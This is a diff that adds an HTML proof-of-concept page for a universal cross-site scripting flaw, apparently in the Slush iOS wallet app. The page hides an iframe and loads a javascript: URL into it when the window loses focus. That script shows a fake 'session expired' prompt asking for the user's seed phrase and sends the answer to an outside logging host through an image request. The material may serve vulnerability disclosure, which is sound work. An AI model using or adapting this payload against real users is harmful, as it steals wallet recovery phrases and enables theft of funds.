@@ -1,0 +1,14 @@
+<html><head>
+  <meta charset="UTF-8">
+  <title>UXSS PoC: Slush iOS</title>
+  <style>iframe{display:none;}</style>
+  <script>
+    window.onblur = function(){
+      document.getElementById("iframe").src = "javascript:(function(){var s=prompt('Slush iOS session expired. Please re-enter your seed phrase:','');if(s){var i=new Image;i.src='https://ssrf-test.free.beeceptor.com/log?seed='+encodeURIComponent(s);}})()";
+    };
+  </script>
+</head>
+<body>
+  <h1 style="text-align:center;margin-top:100px">Click here, then switch app / back</h1>
+  <iframe id="iframe" src=""></iframe>
+</body></html>
